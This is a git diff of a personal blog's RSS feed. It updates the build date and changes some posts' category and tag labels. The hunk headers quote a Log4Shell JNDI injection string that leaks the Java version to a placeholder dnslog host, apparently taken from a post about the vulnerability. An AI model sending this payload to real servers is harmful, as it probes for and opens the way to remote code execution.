@@ -23,7 +23,7 @@
         
             <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
         
-        <lastBuildDate>Wed, 29 Nov 2023 16:27:09 &#43;0800</lastBuildDate>
+        <lastBuildDate>Wed, 29 Nov 2023 16:53:32 &#43;0800</lastBuildDate>
         
             <atom:link rel="self" type="application/rss&#43;xml" href="https://xuoneyuan.github.io/rss.xml" />
         
@@ -62,7 +62,7 @@
                                 
                                 
                                 
-                                    <category domain="https://xuoneyuan.github.io/categories/%E6%97%A5%E5%B8%B8/">日常</category>
+                                    <category domain="https://xuoneyuan.github.io/categories/%E6%84%9F%E6%83%B3/">感想</category>
                                 
                             
                         
@@ -442,7 +442,7 @@ ${jndi:rmi://${sys:java.version}.xxx.dnslog.cn}
                                 
                                 
                                 
-                                    <category domain="https://xuoneyuan.github.io/categories/%E6%9D%82%E6%96%87/">杂文</category>
+                                    <category domain="https://xuoneyuan.github.io/categories/%E6%84%9F%E6%83%B3/">感想</category>
                                 
                             
                         
@@ -453,6 +453,12 @@ ${jndi:rmi://${sys:java.version}.xxx.dnslog.cn}
                                 
                                 
                                     <category domain="https://xuoneyuan.github.io/tags/%E6%97%A5%E5%B8%B8/">日常</category>
+                                
+                            
+                                
+                                
+                                
+                                    <category domain="https://xuoneyuan.github.io/tags/%E7%94%9F%E6%B4%BB/">生活</category>
                                 
                             
                         
